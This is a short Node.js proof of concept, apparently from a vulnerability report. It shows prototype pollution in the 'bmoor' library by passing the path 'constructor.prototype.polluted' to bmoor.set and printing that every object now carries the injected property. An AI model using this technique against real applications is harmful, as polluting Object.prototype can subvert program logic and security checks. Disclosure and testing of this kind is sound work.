console.log({}.polluted);
const bmoor = require('bmoor');
bmoor.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);